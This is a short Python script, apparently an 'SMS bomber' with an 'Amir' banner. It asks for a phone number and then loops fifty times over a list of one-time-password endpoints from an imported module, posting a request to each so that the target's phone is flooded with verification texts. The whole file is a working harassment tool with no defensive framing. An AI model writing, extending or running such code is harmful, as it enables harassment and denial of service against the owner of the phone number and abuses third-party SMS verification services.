from resources import OTP
import requests 
import pyfiglet 
from colorama import Fore,init 

init()
print( Fore.RED + "************************************************************")
logo = pyfiglet.figlet_format("Amir", font = "slant")
print(logo)
print( Fore.RED + "************************************************************\n\n")
print( Fore.WHITE+"SELECT Server SMS-Bomber:" + '\n' + Fore.RED + "--> 1" + Fore.YELLOW + " Server One" + '\n')

try:
    number = str(input(Fore.GREEN+"Enter phone number without ( -0- ): "))

    apis = OTP(number)     

    for _ in range(50):
        for url, payload, in apis:
            try:
                response = requests.post(url, data = payload)
                if response.status_code == 200:
                    print( Fore.RED + number + ' ' + Fore.GREEN + "successfully" + ' ' + Fore.LIGHTBLACK_EX + '('+ url +')' +  '.' )
                
            except requests.exceptions.RequestException:
                print("ah, shit")
                
except KeyboardInterrupt:
    print("\nGoodbye!")